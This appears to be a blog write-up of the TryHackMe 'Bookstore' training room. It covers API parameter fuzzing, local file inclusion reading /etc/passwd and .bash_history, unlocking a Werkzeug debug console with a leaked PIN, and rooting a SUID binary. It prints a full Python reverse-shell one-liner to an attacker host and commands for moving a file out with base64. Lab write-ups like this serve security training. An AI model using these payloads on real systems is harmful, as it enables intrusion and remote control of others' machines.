---
layout: post
title: "Bookstore - TryHackMe"
permalink: "/bookstore-tryhackme"
color: rgb(61, 130, 82)
excerpt_separator: <!--more-->
author: ritiksahni
tags: [TryHackMe, API, Fuzzing]
---

<center><img src="assets/img/posts/bookstore-thm/room_header.jpeg"></center>

This room is made by [Siddhant Chouhan](https://tryhackme.com/p/sidchn). It takes us through API fuzzing, local file inclusion to gain RCE and exploiting a custom 64-bit binary.

<!--more-->
## Port Scanning

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-15 20:35 IST
Nmap scan report for 10.10.242.30
Host is up (0.61s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.04 seconds
```

We can see port 22, 80, 5000 open.

There is SSH on port 22, HTTP servers on port 80 and 5000. Nmap also indicates about `/robots.txt` file on port 5000.
s
Let's first explore the port 80...

## HTTP (Port 80)

![bookstore-homepage](assets/img/posts/bookstore-thm/port-80-homepage.png)

We can see a website of a "Bookstore" as expected. The burger-menu at top right corner shows us some available pages like login.html, books.html, index.html

#### Directory Bruteforce

I ran `gobuster` on port 80 to look for more webpages and got the following result:

```
/images => 301
/index.html => 200
/login.html => 200
/books.html => 200
/assets => 301
```

We are already aware of the pages with 200 status code but `/assets` and `/images` is new for us. Taking a look at those, we see that they have image files and source code. 

![assets/js](assets/img/posts/bookstore-thm/port-80-assets.png)

`/assets/js/api.js` is an interesting javascript source file which includes the code for requesting data from API endpoint and serve it as HTML formatted data.

```js
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }


async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```
  
<details>
<summary>Understanding api.js</summary>
We have 3 functions in the source file:<br>
<br>
getAPIURL()<br>
This function just stores ":5000" (port number) appended to the hostname in the variable "str" which is further used in other functions.<br>
<br>
getUsers()<br>
This is an async function which takes the output of getAPIURL() and saves it to a variable "u" and makes the request to the formed URL (http://MACHINE-IP:5000/api/v2/resources/books/random4) and returns the JSON response.<br>
<br>
renderUsers()<br>
This is also an async function which takes the output of getUsers() and renders the JSON output to HTML to present it on the website on port 80 on books.html, in simple words, data from JSON representation is converted to HTML code in a well formatted manner with the help of this function.
</details><br>
<br>

The comment at the end of the javascript file indicates that previous version of the API implementation had "Local File Inclusion" vulnerability...

![loginpage](assets/img/posts/bookstore-thm/port-80-loginpage.png)

The sign-up button here doesn't work but checking the page source gave us an interesting clue...

![80-comment](assets/img/posts/bookstore-thm/port-80-loginpage-comment.png)

What debugger PIN could it be?

Remember we found port 5000 running a `Werkzeug/0.14.1 Python/3.6.9` server?!

<details>
<summary>Understanding Werkzeug</summary>
Werkzeug is a utility library for WSGI. WSGI is a protocol which ensures that the web application and the web server are working together and the communication is smooth.
</details><br>


## HTTP (Port 5000)

The `debug` panel of Werkzeug can allow us to run python code and eventually run system commands using python modules like os and subprocess.

We can access the debug panel at `http://MACHINE-IP:5000/console` but in this case, the console is locked and we need a PIN to unlock it, we don't have it yet.

![locked-console](assets/img/posts/bookstore-thm/port-5000-console-locked.png)

In `/robots.txt` we can see a disallowed entry of `/api`

![locked-console](assets/img/posts/bookstore-thm/port-5000-api-docs.png)

Visiting /api gives us an API documentation with several endpoints to access data from API server.

```
/api/v2/resources/books/all => All books in database.
/api/v2/resources/books/random4 => 4 random books from database.
/api/v2/resources/books?id=1 => Requesting books data by 'id' GET parameter.
/api/v2/resources/books?author=J.K. Rowling => Requesting books data by 'author'.
/api/v2/resources/books?published=01-01-1970 => Requesting books data by date.
```


We can see that this is the version 2 or "v2" implementation of the API, as one of the hints indicated that older version of API was LFI vulnerable, we can try to access v1 and see if it's still available to access.... and IT IS!

Opening http://MACHINE-IP:5000/api/v1/resources/books/all works and we get the data, we know that there is LFI somewhere in this API implementation, we can try fuzzing the GET parameters in 'books' to see if there are any other parameters than the ones we know about, already.

I used [ffuf](https://github.com/ffuf/ffuf) for this as it's really fast (written in golang). For discovering the parameters, I used this great wordlist available in SecLists repository -- [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)

![ffuf-at-work](assets/img/posts/bookstore-thm/ffuf-get-param-fuzzing.png)

```bash
ffuf -u 'http://MACHINE-IP:5000/api/v1/resources/books?FUZZ=//etc/passwd' -w burp-parameter-names.txt
```

The tool ffuf will discover a new parameter `show` with content length of 1555 (if requested /etc/passwd) and it's a good sign as this content length is higher than the other responses.

We can open the URL in our browser to access the resource...

![lfi-passwd](assets/img/posts/bookstore-thm/lfi-passwd.png)

We can confirm that we found local file inclusion, now here can we see that there is a user `sid` and based on one of the previous hints, we can try accessing /home/sid/.bash_history to get the DEBUGGER console PIN

![bash_history](assets/img/posts/bookstore-thm/sid-bashhistory.png)

We get the PIN `123-321-135`. Werkzeug requires you to store the PIN in an environment variable which can be defined through `export` in linux so make sure to check to always check .bash_history to discover potentially sensitive information like we found now.

#### Logging into /console

We can now open http://MACHINE-IP:5000/console and put in the PIN `123-321-135` to get access to the interactive python console.

Executing system commands using python can be done by modules like `os`.

```python
import os
os.popen('ls').read()
os.popen('cat user.txt').read()
```

This code will execute 'ls' command and list out the files in current directory and also give us the user flag for this machine!

![console-ls](assets/img/posts/bookstore-thm/port-5000-userflag-console.png)

For a proper reverse shell we can use a python reverse shell script to get a callback on our host machine with /bin/bash

```python
# Replace RHOST, RPORT with your IP and Port and put this script in the interactive web based werkzeug console.
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

A few seconds later, we get a callback with /bin/bash as `sid`.

![reverse-shell](assets/img/posts/bookstore-thm/reverse-shell.png)

## Privilege Escalation

The home file of user `sid` has a couple of files inside...

The two scripts “api.py” and “api-up.sh” is just to spin up the API server and books.db is the database file containing the list of books which are displayed on the website (port 80).

We are now left with try-harder which is a SUID file.

![try-harder-binary](assets/img/posts/bookstore-thm/tryharder-binary-wrong.png)

We can base64 the file on victim machine, decode the base64 on host machine to get the file on our own machine.

```bash
# Victim machine

cat try-harder | base64

# Host machine

echo BASE64-DATA | base64 --decode > try-harder
```

Running `file` command on locally obtained `try-harder` confirms that we got the 64 bit ELF binary as expected. We can try analyzing the binary using tools like `Ghidra`.

We need to load the file in Ghidra and go to `functions` tab and click on `main` and on the right side we will get the inspected source code of `main` function from the binary.

```c
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

There are a few local variables declared and the binary is checking if the input is equal to `0x5dcd21f4` or not. If yes, it'll drop a shell as root. If not, it'll just print an error and exit the program.

Value of local_14 has to be 0x5dcd21f4 to drop a root shell as ‘/bin/bash -p’ gets executed.

We can obtain the required input by the following logic:

0x5dcd21f4 ^ 0x1116 ^ 0x5db3 and we will obtain the value required to pass the check.

![xor-logic](assets/img/posts/bookstore-thm/xor-logic.png)

We can use `1573743953` as input and we will pass the check. We should get a shell now as the program executes `/bin/bash -p` if check is passed and as it is a SETUID binary (root permissions), it'll be a root shell.

![rooted](assets/img/posts/bookstore-thm/rooted.png)


We finally got root! It was fun :-)
<br><br>
> I hope you enjoyed reading this write-up and learnt more about APIs, analyzing source code and utilities like Werkzeug.<br>Hit me up on my socials to give feedback, suggestions for my upcoming work. [Contact Me](/contact)


